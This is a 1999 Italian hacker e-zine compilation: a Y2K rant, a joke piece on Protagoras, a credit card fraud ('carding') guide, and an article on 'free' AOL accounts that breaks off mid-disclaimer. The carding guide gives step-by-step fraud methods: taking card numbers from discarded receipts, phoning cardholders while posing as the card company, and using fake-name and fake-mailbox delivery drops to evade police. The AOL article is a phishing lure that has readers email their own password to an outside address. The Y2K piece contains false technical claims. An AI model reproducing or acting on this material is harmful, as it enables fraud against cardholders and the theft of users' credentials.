               ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
               ÷ִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ¿÷
               ÷³ BREVE RIFLESSIONE SUL MILLENIUM BUG... ³÷
               ÷ְִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ÷
               ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

Autore: cod
  Data: 19/09/1999 (altrimenti non passo il millenium bug...)
Argomento trattato: Breve riflessione sul millenium bug...

Ok... scrivo questo articolo solo per dare un'idea un p• chiara su questa
storia... so che l'argomento  pompato alla Tivi— come dice Homer Simpson
ma sinceramente dicono solo cazzate celestiali....

Come molti di voi sanno, in particolar modo quelli che all'inizio degli
anni '90 avevano la fortuna di possedere un PC la memoria di massa aveva
un costo a dir poco esagerato... ricordo che nel 1993 una confezione di
floppy disk da 1.44Mb non formattati targati come Olivetti qui nella zona
di Vibo Valentia aveva un costo non indifferente di circa 40.000 lire!
Software quali il Pkzip, Arj, Rar e compagnia bella erano come la manna
caduta dal cielo.. grazie a loro si riusciva a risparmiare quantit… a dir
poco straordinarie per la memorizzazione di dati.. ma prima di essi cosa
esisteva ? niente di speciale...

I primi programmatori... quelli che lavoravano su mainframe e su server...
dove i costi delle macchine erano a dir poco eccessive erano costretti
a tener conto della questione soldi... uno dei processori che ha dato
il via alla gloriosa serie 86 il vecchio 8080 e l'8085 erano capaci di
indirizzare la grossa quantit… di un kilobyte di memoria !!! AVETE
CAPITO BENE.... manco CONFIG.SYS ed AUTOEXEC.BAT starebbero in quella
quantit… di memoria...
Il costo della ram non era indifferente (1 Mb = 100.000) e lo stesso
per quello dei dischi fissi introdotti con la diffusione di ms dos 2 e
successivi (ms dos 3.3 !!).

Ora voi immaginate di essere un programmatore.. costretto a dover
tener conto di questo fattore... e dovete scrivere un software per la
gestione della contabilit… di una banca... dove incominciamo a tagliare ?
Di sicuro non nelle cifre del c/c ma bens in quelle noiose e ripetive
date.... ma dove di preciso ? si l.... nel secolo!

Quindi la data 3 marzo 1985 poteva essere memorizzata come 030385 
e codificati in cifre binarie in ben 3 byte... !!

Ora dove sta il problema sul mio pc ?
Che cosa mi significa che Windows  pronto all'anno 2000.... che i programmi
che acquisto sono certificati per l'anno 2000 ? Che quei stupidi programmatori
che hanno scritto il software fino al 1998 si sono resi conto che era ora
di abbandonare quella stupida codifica altrimenti si andava incontro a guai
seri! e soprattutto che l'hd di un utente non  20 megabyte ma bens almeno
2.5 gigabyte.

Principalmente i nostri PC non credo che ne risentano di molto... in quanto
la memoria CMOS, ovvero la memoria dove l'ora e la data vengono aggiornate
anche quando il vostro PC  spento sono state progettate per contenere date
fino al 2100... per• anche qui si pone un problema... tutti i sviluppatori
dei bios si sono impigriti pure loro e qualche bios non scrive manco il
secolo.... ma lasciamo stare che questa  un'altra storia..

Ammenocch voi non siate utenti di un software di va a vedere quale anno
(cazzo.... la consulente commerciale qui ha un programma dell'86... mo
altro che dichiarazioni dei redditi qui faranno.... il macello succede!)
sia stato scritto.... non vi dovreste porre chiss… quale problema...
Personalmente credo che si debbano preoccupare gli utenti di alcuni
programmi di Lotto .... ma oramai quasi tutti sono programmati a gestire
correttamente anche il secolo.... e gli utenti dei software scritti
in linguaggio COBOL (mo mi spiego perch 2 anni fa c'era una ricerca
particolare di programmatori di questo linguaggio...) ma questo sar…
a dir poco un ostacolo brutto.... gi… per il fatto che il COBOL non 
che sia tanto usato... poche persone ancora lo usano e sopratutto
 da parecchio tempo che non escono nuovi compilatori o interpreti
per tale linguaggio.....

Chi si deve preoccupare non siete voi come tutti vi fanno credere...
ma bens gli organi quali le banche, l'INPS, l'ufficio comunale....
so che sono collegati alla vita delle persone e bench si dica
che il sistema bancario possa andare in tilt chi non ci dice che
possa automaticamente accreditarci interessi all'infinito ?
.... sarebbe bello ricevere a gennaio dopo le feste (e dopo tutti
quei soldi sprecati per dare il benvenuto al nuovo millennio) l'estratto
conto della banca con su scritto EURO 100.000.000 di interessi!!!!
E' nell'interesse degli organi correggere questo problema... in quanto
voi potrete dimostrare facilmente che i soldi erano quelli e sono quelli
mentre la banca come lo spiega il fatto degli interessi ?

Fate sonni tranquilli.. e se sentite alla TV cazzate del genere....
semmai compare il numero di telefono chiamateli e mandateli a fanculo
da parte mia :)

Questa storia ha fatto solo un casino infernale... ma non mi sono
mai preoccupato.. e un'altra cosa.... non comprate quei programmi
scemi che vi dicono se il vostro software  compatibile all'anno
2000... tanto i programmatori bastardi nel 2001 incominciano a tagliare
di nuovo le cifre :) con le conseguenze che i vostri nipoti vi verrano
a tirare fuori dalla tomba x farvela pagare....

PER QUALSIASI COMMENTO... RIFLESSIONE... STRONZATA... la mia mail  a
vostro disposizione:
cod@gurlmail.com

Se ho detto qualche cazzata non me ne vogliate a male... ma alla fine dei
conti ho pi— ragione io che quel coglione che presenta il telegiornale.

Ringrazio tutti i giornalisti che sparano cazzate.. ottimo spunto x una
cazzata e tutti coloro che troveranno questo breve articolo interessante
e soprattutto nobody se pubblicher… questa cazzata....

Un grosso saluto ai ragazzi e ragazze che frequentano l'ITC di VV... auguri
di buon anno scolastico da quello che non conosce nessuno! ciao ;)

(TENTATIVO DI CORRUZZIONE.... :)

P.S. Questo non c'entra... se siete programmatori e se pensate di memorizzare
la vostra data in 2 byte abbiate la volont… di usare dati di tipo unsigned..
altrimenti fra 30000 anni circa dovrete riaggiornare il software ;)

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

                     ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
                     ÷ִִִִִִִִִִִִִִִִִִִִִִִִִִִ¿÷
                     ÷³   PROTAGORA RULEZZA !!!   ³÷
                     ÷ְִִִִִִִִִִִִִִִִִִִִִִִִִִִ÷
                     ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

        Titolo: l'articolo precedente era troppo serioso cosi'
                ho deciso di scriverne un altro un po' meno
                serio...ma sempre importante!

Ihihihii....incominciamo bene...uno dei titoli + lunghi della storia
delle e-zine ( :PP ).....cmq 'sto articolozzo si presenterebbe come
un articolo di hacker philosophy o anche come un articolo di storia
in realta' non e' proprio un bel caxxo se non una serie di parole senza
senso messe una dietro l'altra...(che caxxo lo scrivo a fare ???boh)

**Pausa...e' Sabato sera...21:47...devo uscire i miei amici mi
aspettano gia' da mezz'ora...porc'**

**Notte pazza**

*Ubriaco fradicio* (chi ha detto che gli hackers stanno sempre a casa
		    vicino al comp. e si sparano pippe dalla mattina
		    alla sera..???)(...io non sono un hacker quindi
		    non devo essere preso in considerazione...)

*Mattina*

*Mal di testa modello martello pneumatico*

Porc'....e' l'1:41...appena svegliato.....porca miseriaccia ho un mal
di testa da cavallo...i cavalli hanno il mal di testa ???bah....
vabbe'.....scriviamo 'sto azz di articolo....

Th|5 4rT I5 DeD 2: Vito...per favore hackati il Coma...torna tra noi
		   fratello...plz.... :°°°°(
		   Pollicina....grazie degli splendidi 4 giorni passati
		   insieme...

Th|5 ArT i$ Vs-d3d t0: Nin zo....in questo momento non ho nessuno sulle
		       palle..boh...poi scrivo qualke caxxata... :Ppp

Questo articolo vi servira', spero, a capire che per essere hacker non
c'e' bisogno di saper usare bene una tastiera un mouse o caxxate del genere,
hacker si nasce...si e' dentro.....

Nessuno di voi a scuola ha mai studiato i sofisti ???
Bene ve ne era uno in particolare di nome Protagora....beh...penso che
costui sia stato uno dei primi hacker della storia del mondo...sentite
un po' che bell'esempio di social engeneering :
Protagora aveva una scuola in cui ai suoi allievi insegnava la retorica,
bene questa scuola era molto cara e quindi un giorno un suo discepolo 
di nome Evatlo gli disse:

Evatlo- O Protagora, brutto figlio di una cagnaccia lebbrosa in calore...
        perche' mai dovrei pagarti ora ?? Solo quando saro' riuscito a
        vincere il mio primo processo e solo allora ti paghero'.

Protagora non si scompose....fece un lungo respiro e poi disse:

Protagora-Caro Evatlo, tu non hai scampo, giacche' io ti cito subito in
	  giudizio: se i magistrati ti daranno torto, mi dovrai pagare
          perche' hai perso, se ti daranno ragione mi dovrai pagare perche'
	  hai vinto! Brutto figlio di una vaccaccia lorda rotolatasi in uno
	  sterco di cavallo !...(quest'ultima parte l'ho aggiunta io :Pp)

Ecco.....questo penso sia uno delle prime testimonianze scritte in cui
l'inteligenza l'astuzia ed il modo di parlare ingegnoso si siano combinati
per fregare un'altra persona :Pp

PLZ...fatemi un favore...fate attenzione a non classificare come LAMER i
neo-newbie...o neo-wannabe....se vi fanno domande stupide...e' solo perche'
vogliono imparare....certo non per questo sono autorizzati a farvi 3000
Qps (questions per second).....dobbiamo campare anche noi !

Vabbu'......terminiamo 'sto articolo che mi sono gia' rotto....salutatemi
tutte le vostre rispettose madri...e fatevelo scannerizzare e/o eventualmente
masterizzare da un toro sordo in corsa vestito da Zorro che balla la samba
sul tavolo dell'osteria di cui era padrone il matador...Ciaooooooooooo
				_______
                           <----Dantino---->
			  <----Alighieri---->
			       ^^^^^^^^^
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

     XaRaBaS "DeaTh's ProDucTioNs" (c) PreSenTs......

     ******************************************************************
     *                                                                *
     *   ____                                                         *
     *  |           _                  __                             *
     *  |       _  | |  |\   .  |\ |  | _                             *
     *  |____  |-| | \  |_\  |  | \|  |__|                            *
     *                                                                *
     *           ______                                               * 
     *              |           _    _       _   |                    *
     *              |  | | ___ | |  | |  .  |_|  |                    *
     *              |  |_|  |  |_|  | \  |  | |  |___                 *
     *                                                                *
     *                                                                *       
     *       -- Ovvero la guida del "Cardatore Italiano" :-) --       *
     *                                                                *
     *    by                                                          *
     *                                                                *  
     *     \  /       _         _         __      __   __             *
     *      \/   _   | |   _   |_|   _   |__     |__| |__|            *
     *      /\  |-|  | \  |-|  |_|  |-|  ___|     __|  __|            *
     *     /  \                                                       *
     *                                                                *
     ******************************************************************

    ---§ Indice
 
      1) Cos'e' il Carding?
      2) Come Riconoscere una carta di credito
      3) Tradare carte di credito
      4) Il Trashing
      5) I Generatori di carte di credito
      6) Cardare : Un arte!
      7) Carding Pratiko ( finalmente dopo tutta sta merda di teoria! :-P )

      ------§ 1) Cos'e' il Carding?
         
Salve, io sono XaRaBaS, un ragazzo che inizio' a smanettare con un compy a 6
anni ed ora si ritrova a scrivere cazzate su di un file txt.... :-) Beh con
questa guida vorrei dare una mano a tutti quelli che mi hanno sempre fatto
la stessa domanda: "Scusa mi dici come si carda"? Beh boyz, niente di +
semplice.... certo non e' cosi' semplice, anzi mi correggo, e' facile farsi
arrivare a casa della roba comprata online con cc, ma e' molto + complikato
non farselo consegnare dalla GDF.... :-)
Beh la mia passione naque per caso, quando x la prima volta in irc mi
passarono una cc funziante ( per cc = credit card | per funziante = che
funziona! N.d.X.) Dapprima mi sentii il re del mondo, ma poi kapii che
bisognava stare attenti. Tutto quello che ho scritto qui e' tutto frutto
dell'esperienza, e xcio' anche se scrivo kazzate non fateci caso... :-)

      ------§ 2) Come Riconoscere una carta di credito

Eh, si! Si fa presto a dire "carta di credito".... Bisogna prima esser
consapevoli di cosa si parla. Intanto vi sono tanti tipi di carte di credito,
le + usate nell' e-commerce (commercio elettronico) sono:

- Visa
- MasteCard 
- Carta Si'
- American Express
- Diners Club
- DiscoverCard

Ma quelle + usate in italia sono soprattutto Visa, MasterCard e Carta Si'. Ma
Non e' finita qui! Ogni carta di credito, che puo' essere formata da 13 o 16
(+ comuni) cifre, viene accomunata ad un gruppo, riconoscendola dal prefisso,
cioe' dalle prime 4 cifre.
Poi vi sono carte che sono come degli equivalenti di grandi carte come la
Mastercard. Ad esempio L'eurocard, e' accomunata alla mastercard. Se ne
doveste avere una, quando cardate, dovete mettere "Mastercard" come tipo di
carta, e confermando quello che prima ho detto, funziera' senza prob. Mentre
x il cardatore Italiano nasce un piccolo problema: Infatti il prefisso della
Visa si confonde con quello della Carta Si' in alcuni casi come questo:

Visa     : 4593 3991 0439 2394
Carta Si' : 4576 3892 9921 8311

Come potete Vedere I prefissi sono simili, come fare a riconoscere? Beh boyz,
basta solo essere un po' + furbi del solito. Quando vi passano cc fatevi sempre
dire che tipo di carte sono. Kmq, i prefissi variano da banca a banca di
rilascio della carta, infatti, alla guida ho allegato 2 programmini simpatici:
1) GenCCard (un generatore di cc very nice)
2) GenerID (Un prog scritto da cavallo de cavallis, che crea personalita'
   false, comprendendo nelle info anche delle Carta Si' ottimo x cardare i
   servizi online. testato pesonalmente da me, e funzia!)
3) Card Master 4 (un ottimo generatore di cc, che contiene quasi tutti i
   prefix delle carte di credito americane, ottimo x conoscere le info di
   carte straniere che magari girano in irc).
Beh sono tutti degli ottimi software.

      ------§ 3) Tradare Carte di credito

Okky Boyz, questo e' un argomento delicato , xcio' leggete questo capitolo con
mooolta attenzione! Infatti, a meno che tu non abbia un negozio in cui puoi
fare trashing tranquillamente, la via + semplice x ottenere cc, e' trovare un
amico che ne e' in possesso e farsele passare. Ma bisogna Stare attenti! Xche'
qualche persona, che magari voi ritenete amica e magari non lo e', vi puo'
passare sia un fake (cc generata con un prog, e che magari non funge) o peggio
ancora una CC rubata, che io ho soprannominato una "Ammazza Carder"... X
questo, vi do un consiglio: quando possedete una cc, dovete prima provare e
vedere se funge, magari acquistando un servizio online, cosi' potete avere la
conferma e sapere se potete continuare ad usarla x qualsiasi vostro intento.
In questo campo, come in tanti altri, gli errori si pagano con la galera. Un
Certo "Yoda" che stava sul chan #cc di irc.tin.it, si riteneva bravo, ma
adesso sta dietro le sbarre.. in effetti il fatto suo lo sapeva, ma
stupidamente sbaglio', e dopo poco pago'. xcio' mi raccomando..
PRUDENZA! (a meno che voi non volgiate andare in galera.... ;-P) 

        ------§ 4) Il Trashing

Cos'e' il trashing? Lo dice la parola stessa: Trash, dall'inglese "spazzatura",
cioe' consiste nel cercare nei cestini della spazzatura dei negozi dove si
acquista con cc, i fogliettini usati nella procedura di pagamento, dove sono
scritte le informazioni a noi neccessarie, ma ne parleremo + avanti; Beh in
questi foglietti, ci sono scritte le seguenti info: 

Cardholder / Utente della carta : MARIO BIANCHI

Card Number / Numero della carta : 4566-7584-4821-2321

Expiration Date / Data di scadenza : 02/02 ---> (sta x 2002)

In + troviamo anche il numero di telefono....
Beh ora dobbiamo servirci del Social Engeneering ovvero l' "Ingegneria
Sociale".
Beh starete pensando cosa kazzo puo' essere, beh vi diro':
Bisogna in pratica telefonare a casa del carholder, facxendo finta di essere
quello della visa o della mastercard, chiedendo, usando come scusa un guasto
ai database, le informazioni riguardo l'indirizzo, e tutti i dati, cosiddetti
"Billing", cioe' che sono nell'archivio della banca, che molto spesso x certi
tipi di carding vengono richiesti. Beh fatto cio', noi otterremo, sempre se
non si ci fa sgammare, una ottima cc! GooD LucK! 

        ------§ 5) I Generatori Di carte di credito

Beh, guardate, vi diro', quando mi affaciai sulla scena rimasi deluso da
questi programmini, ma dopo averne collaudati tanti, solo questi 3 si
salvavano, cioe' quelli che sto allegando a questa guida, soprattutto il
mitico "GenerID" di Cavallo de Cavallis. E' la migliore via x registrare
servizi online. Beh state attenti ai fake! Usateli solo x registrare online
vari servizi, altrimenti il pacco a casa vostra ve lo consegna la GDF...
ATTENzIONE!!!
  
        ------§ 6) Cardare : Un ARTE!

Ragazzi, per cardare, oltre ad essere consapevoli, bisogna essere anche
artisti! :-)
Eh si, bisogna saper scegliere la tecnica giusta, avere inventiva, sopratutto
quando bisogna colmare gli spazi riguardanti gli altri dati, e farli sembrare
il + possibile veritieri.... ci vuole allenamento, ma scommetto che dopo aver
letto sta guida, diventerete dei super-cardatori :-P
Ma ora basta! Passiamo al carding pratiko! EVVAI ! VISA RULEZ! :-P

         ------§ 7) Carding Pratiko!!! 

Beh ragazzi, e' giunto il moemento di agire! AUMENTA LA CRISI! AUMENTA IL
CARDAGGIO eheh ;-)
Beh i 2 punti deboli che possono fare sgammare nel cardaggio sono 2:

- Il nostro IP
- L'indirizzo dato x la spedizione   

Beh ragazzi, questi sono i nostri punti deboli, x il resto non ci sono prob
nello sgammaggio..
Il primo problema puo' essere risolto, usando sia wingate che proxy (se non
sapete usare un proxy o un wingate, leggetevi la mia guida sull'smtp! :-)
cosi' che sarete protetti. Riguardo Al secondo problema, x risolverlo basta
pensare "alla Poliziotta" seguendo il seguente schemino:

- Voi Cardate Una Scheda Video
- In Banca vengono addebitate 250.000 e' (nel caso fosse na Savage 4 della 3d
  Blaster ;-P)
- Dovete Farlo arrivare a casa vostra o da qualsiasi altra parte.
- Vi arriva a casa, e voi impazzite dalla gioia!
- Il sig. Bianchi riceve il resoconto delle spese fatte con la sua cc.
- Si accorge che mancano 250.000 e' all'appello.
- Chiede Info alla banca.
- La banca risponde dando le info circa il negozio dove e' stato fatto
  l'acquisto.
- Il negozio, grazie alla legge della privacy non puo' dire niente.
- Il sig. Bianchi si inkazza, e inizia una causa penale + denuncia di truffa
  aggravata (un bel po di anni)
- Allora il negozio da i dati riguardanti la spedizione.
- C'e' il nominativo vostro
- Vi arriva a casa la GDF e vi porta con se.
- Fine della Storia

BoyZ questa non e' una bella storia, percio' vedete di non fare la stessa
fine..... kmq come abbiamo detto prima se cardate servizi online, basta un
wingate o un proxy x nascondere le tracce, ma x aggirare il 2° problema,
esistono 2 tecniche, di cui 1 di mia invenzione;

---> La tecnica "del nome inesistente"

---> La tecnica "della cassetta" (da me inventata e ideata!)

             --->*************************************<---
             --->*                                   *<---
             --->*            La Tecnica             *<---
             --->*                                   *<---
             --->*      "Del nome inesistente"       *<---
             --->*                                   *<---
             --->*************************************<--- 

Okky, questa boyz e' la tecnica + usata e anche quella + vecchia dai cardatori.
E' di semplice concezione. In questo modo si puo' fare arrivare roba a casa
propria senza essere sgammati. Fate l'ordine, e fate arrivare la roba a casa
vostra usando un nome falso, ma mi raccomando attenzione: non fate l'errore
di mettere un address come questo: " Franco Giunta, c/o IlVOSTROVERONOME,
via ecc ecc. " xche' vi sgammano lo stessO! dovete usare un address come
questo: " Franco Giunta , via Fankulo alla GDF, 2/a Roma 36722" 
Poi fate un etichetta da attaccare al citofono e alla cassetta delle lettere
sopra quella vostra, beh, e siate sikuro che non vi sgammeranno mai.
Naturalmente appena vi arriva la roba, staccate l'etichetta! :-) Per i nomi
da mettere nell'etichetta, siate fantasiosi ma non troppo! Dovete mettere
nomi magari comuni nella vostra citta' o provincia. C'e' un piccolo dettaglio
da sottolineare: Se abitate in un condominio, o complesso residenziale,
questa tecnica e' perfetta, ma se abitate in una casa singola o di campagna,
beh vi conviene usare la tecnica della cassetta se ci tenete a non andare in
galera...... ;-)
Usando questa tecnica lo schemino di prima diverra' cosi':

--> Il sig. Bianchi si inkazza --> LA GDF va all'indirizzo di spedizione  ---|
                                                                             |
Perde le vostre Tracce <-- Non trova l'indirizzo col nome "franco Giunta" <--|
 |
 |-> Siete Salvi ed avete una Savage a 32 Mb... hehehehehe

             --->*************************************<---
             --->*                                   *<---
             --->*            La Tecnica             *<---
             --->*                                   *<---
             --->*         "Della Cassetta"          *<---
             --->*                                   *<---
             --->*************************************<--- 

Beh raga, in un momento di ispirazione, dopo aver incorporato litri e litri
di vodka alla peska ehehehhe, ho inventato questa tecnica di carding, sicura
+ della tecnica precedente:
Sopratutto se abitate in campagna. Dovete semplicemente comprarvi (azz, che
sa da fa', x non andare in galera... eheh) una casetta delle lettere, di
quelle che si pianta il palo e poi si ci attacca la cassetta, mettete come
etichetta il nome che volete, e usatelo come recapito. Quando arriva l'avviso
del pacco voi lo prendete, fate scomparire la cassetta, e andate
tranquillamente a prendere il pacco alla posta. Niente di + semplice! e di +
sikuro!
Anche xche', la gdf va a cercare in una contrada questo tizio e non lo trovera'
mai! E voi Vi godete quello che avete cardato! Vi dico che l'ho provata e
collaudata, e funge benissimo solo un consiglio: si consiglia di piazzare la
falsa cassetta della posta, all'inizio di una traversa, in modo che il
postino la lascia senza insospettirsi, infatti la maggior parte delle volte
sono cosi' pigri, che appena vedono una cassetta, si ci buttano e vi infilano
quello che devono.... CHE STUPIDI! ehehheehhe KASSETTAZ RULEZ!
___________________________________________________________________________________________

  Quindi ricapitoliamo con un semplicissimo schemino:
                     
                                   Cardare
                             /                \
                            /                  \
                     Servizio Online          Scheda Video
                 /                                       
               /                                           \
             /                                               \
      Wingate o Proxy                                        / \                             
                                                            /   \
            |                         Abitazione Condominio      \
            |                                                     \
            V                           |
       Cardamento                       |                  Abitazione Campagna
                                        V                                  
            |                                                     |
            |              tecnica "del nome inesistente"         | 
            V                                                     V
     Sikurezza assicurata                |             Tecnica della Cassetta
                                          \           
            |                              |                  |
            |                              V                  |
            V                          Cardamento             V
                                                         
Vi godete quello che avete Cardato!        |             Cardamento
                                          /        
                                         /                  \
                                        /                    \
                    Sikurezza Assicurata                      \
                             
                                                     MEGASIKUREZZA ASSIKURATA!
                    |                                          
                    |                                                    |
                    V                                                    |
      Vi godete quello che avete cardato!                                | 
                                                                         V
               
                                    Vi godete il frutto del vostro cardamento!
______________________________________________________________________________

Okky ragazzi, spero di essere stato comprensibile, e spero che questa guida
vi aiuti a non fare kazzate putroppo frequenti..... Beh alla proxima guida
ciao-byez!

 XaRaBaS 1999

              GreeTs Goes To:

----------------------------------------------------------------------------->
---> StOrM - Zipp0 - F4lc0n - Z10-K4li - Sephy - Rwxrw-r-x - XaNdEr16 -      >
---> Oldiron61 - Nicoletta - N0bodY88 - Zcools - Devil_666 - Sk0rP|0 -       >
---> ]Bug-Byte[ - TUTTI GLI AMICI DI HACKERNOW!                              >
----------------------------------------------------------------------------->
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

               ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
               ÷ִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ¿÷
               ÷³              AMERICAN ON LINE               ³÷ 
               ÷³      (COME AVERE UN ABBONAMENTO GRATIS)     ³÷
               ÷ְִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ÷
               ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

Salve ragazzi in questi giorni mi e' capitato di avere alcune domande in chat
su come avere un abbonamento ad AOL..... !!
Innanzitutto spieghiamo cos'e' AOL.
AOL (American On Line) e' un abbonamento per internet utilizzato dagli
americani che sta' facendo concorrenza alla microsoft del nostro amicone
Bill :):).
Per caso sono venuto in mano di un articolo che spiega piu' o meno cosa sta' 
diventando AOL e la sua quasi supremazia sul WEB, cosi' ho deciso di scriverla 
qui' per farvi capire prima di poterlo utilizzare cosa sta' diventando AOL:

Amercan On Line ha scatenato su tutti i continenti la prima guerra commerciale 
virtuale contro l’assalto di Explorer nelle configurazioni dei personal
computer venduti in tutto il pianeta, creando l’arca dell’alleanza con la Sun. 
La torta in palio vale almeno 4 miliardi di dollari, l’affare in ballo e' di 
dimensioni colossali. Il conto puo' essere percepito solo in via approssimativa. 
Circa 4 miliardi di dollari. Stiamo parlando del gigantesco acquisto da parte 
di American On Line (Aol), il piu' grande provider del pianeta, della societa' 
Netscape che con Navigator (il suo browser ossia sistema di navigazione su
Internet) da sempre si pone come antagonista di Explorer (browser di
Microsoft) di recente andato all’assalto sui mercati mondiali per assicurarsi
il primato assoluto nelle configurazioni dei personal compiuti venduti. Aol
per vincere la sfida ha voluto creare una sorta di arca dell’alleanza con la
Sun titolare dei brevetti di linguaggio "Java". Alcuni dati sulle forze in
campo. Aol puo' contare su un esercito di 14 milioni di utenti e Natscape su
circa 20 milioni di contatti al suo "portale", la porta d’accesso per
Internet. La somma (se si puo' eseguire) fa 34 milioni di clienti, circa la
meta' dell’intera flotta di navigatori su Internet.
Un’operazione che costituisce un importante punto di svolta nelle prospettive
del World Wide Web la grande rete mondiale e del commercio via Internet.
Dunque cio' che almeno apparentemente sembrava un dominio incontrastato di
Microsoft viene ora per la prima volta messo alla prova, con AOL che ingaggia
una sfida diretta alle ambizioni di Microsoft.
Come? Mettendo in piedi l’arca dell’alleanza con la Sun. Una stretta
collaborazione grazie alla quale puo' porre il proprio marchio sulla
piattaforma JAVA.
Microsoft considera Internet come un terreno centrale nelle proprie strategia
di sviluppo, tanto importante da aver offerto a costo zero molte delle
funzioni piu' avanzate di Windows 98, giudicandole funzionali alle strategia
del proprio browser.
Il Web e' la nave che nessuno puo' permettersi di perdere e cio' vale anche per
colui che in questo momento risulta essere il venditore dominate nel mondo
per quanto attiene ai sistemi operativi, ossia Bill Gates.
Nel frattempo AOL ha predisposto per proprio conto una strategia estremamente
aggressiva. Mentre Microsoft soffre per i colpi che le arrivano addosso
(inclusa l’azione della magistratura statunitense che la ritiene responsabile
di agire in regime di monopolio), AOL e' ben felice di distribuire software
gratis attraverso campagne di marketing finalizzate ad assicurarsi quanti
piu' nuovi sottoscrittori possibili al Web.
L’acquisizione di CompuServe rientra in questa strategia: una chiara
indicazione che AOL e' determinata a dominare il mercato. 
Alcuni utilizzatori pero' si sono lamentati per il fatto che la dominanza di
AOL sta eccessivamente uniformando il WEB eliminando in questo modo le
diversita' che contraddistinguono e hanno fatto il successo dello stesso, ma
cio' nonostante i nuovi sottoscrittori continuano ad aumentare.
Netscape gia' aveva tentato di fare la stessa cosa attraverso il Netcenter,
ma non e' stata in grado di operare sui tre fronti contemporaneamente (browser,
server, portal). Ora AOL possiede due dei principali strumenti di Internet,
quelli che costituiscono le principali modalita' di connessione tra venditori
e compratori.
Venditori ed inserzionisti (qualche volta sono la stessa cosa) adesso vedono
in AOL il principale canale e cio' rende sempre piu' evidente quali forti
ritorni commerciali ci possano essere per AOL nel prossimo futuro.
La piattaforma Java e' altrettanto importante. Netscape ha da sempre sostenuto
il sistema Java ed ha avuto stretti contatti con SUN. Attraverso la vendita
della tecnologia server di Netscape alla SUN, AOL potra' lavorare a stretto
contatto con la stessa SUN e sviluppare applicazioni che includano il
commercio su Internet dirette sia ai clienti, sia alla piattaforma di AOL. 
Tutto questo, e' evidente, costituira' un formidabile impulso al commercio
consumer’ su Internet soprattutto in considerazione alla enorme massa di
sottoscrittori AOL la quale vedra', in questo modo, aprirsi prospettive
di poderosi ritorni economici.

Dopo aver aperto questa piccola parentesi su AOL adesso veniamo al nostro
lavoro e cerchiamo di entrare anche noi nel mondo di AOL.
Come avete gia' letto AOL fa' anche abbonamenti gratis :):):) quelli che
utilizzeremo per le pass :)
Prima di tutto dobbiamo avere un bel green altrimenti le nostre bollette
arriveranno alle stelle :)
Seconda cosa dobbiamo andare nel sito di AOL http://www.aol.com e scaricarci
il programmino, piu' o meno 7 MB, che funziona come il nostro netscape o
internet explorer (e' pure piu' bello :):)), poi dopo averlo scaricato ci
uscira' una shermata iniziale "SIGN ON TO AOL" se non vi esce non vi
preoccupate andate nel menu' "Go To" e cliccate su "Set Up & Sign On" e ci
uscira' una schermata simile al nostro accesso remoto di winzozz.
adesso scrivete in "select screen name" : New User
poi cliccate sul pulsante setup e scegliete il numero di telefono piu' vicino
:)).
Ora abbonatevi tranquillamente e avrete accesso ad AOL per 20 ore di
collegamento (quando lo feci io erano 50 :):))
comunque appena abbonati avrete il vostro nome utente e passwd.
Ora provate un po' la stabilita' del vostro abbonamento. :):) (Veloce vero ? :))
Adesso cerchiamo di avere un bel abbonamento per tutto l'anno :):)

Quello che sto' per scrivere e' a puro scopo (di lucro :):)) didattico non mi
ritengo responsabile delle azioni commesse leggendo questo articolo , quindi
non fate cazzate :):).

1) mandiamo una e-mail a Airmax70@aol.com
2) Nel subject box scriviamo lo Screen Name (il nome utente) della persona di
   cui vogliamo sapere la pass (proviamo a caso :):))
3) Nel Message Box scriviamo questa stringa:
   /cgi-bin/start?v703&login=passmachine&f=(la tua password AOL)&f=27586&javascript=ACTIVE&rsa>
4) Mandiamo l'e-mail con un file in attatched con il nome "NO" e con una
   grendezza di un Megabyte
5) aspettiamo due o tre minuti (che ansia :)) e controlliamo la nostra e-mail.
6) Adesso leggiamo l'e-mail, dove vi era la nostra vecchia password adesso
   troviamo la password dello screen name :):) semplice no?

Adesso vi spiego perche':
Bene noi mandiamo questa e-mail direttamente all'AOL central computer, il
quale non accettera' il file attachments senza una password valida cosi'
leggendo la password sbagliata non potra' leggere il vostro file e sara'
costretto a rimandarvela indietro con la password corretta. :):)
Ora non rompetemi le palline sul perche' faccia questa sappiate che lo fa' e
basta. :)                                      

ULTIMO DISCLAIMER: NON MI RITENGO RESPONSABILE DI EVENTUALI DANNI CHE SI
